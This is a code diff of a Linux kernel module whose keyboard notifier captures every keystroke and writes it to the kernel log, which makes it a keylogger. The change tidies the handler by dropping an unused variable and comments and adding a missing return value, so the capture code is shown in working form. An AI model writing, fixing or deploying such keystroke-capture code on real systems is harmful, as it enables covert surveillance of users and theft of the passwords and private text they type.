@@ -47,12 +47,9 @@ static int shiftKeyDepressed = 0;
 
 int notify_intercept(struct notifier_block *nblock,  unsigned long code, void *_param) {
   struct keyboard_notifier_param *param = _param;
-  struct vc_data *vc = param->vc;
-  int ret = NOTIFY_OK;
   if(code == KBD_KEYCODE) {
     if( param->value==42 || param->value==54 )
     {
-      //acquire lock to modify the global variable shiftKeyDepressed
       down(&sem);
       if(param->down)
         shiftKeyDepressed = 1;
@@ -64,7 +61,6 @@ int notify_intercept(struct notifier_block *nblock,  unsigned long code, void *_
 
     if(param->down)
     {
-      //acquire lock to read the global variable shiftKeyDepressed
       down(&sem);
       if(shiftKeyDepressed == 0)
         printk(KERN_INFO "%s \n", keymap[param->value]);
@@ -72,9 +68,8 @@ int notify_intercept(struct notifier_block *nblock,  unsigned long code, void *_
         printk(KERN_INFO "%s \n", keymapShiftActivated[param->value]);
       up(&sem);
     }
-
-
   }
+  return NOTIFY_OK;
 }
 static struct notifier_block nb = {
   .notifier_call = notify_intercept
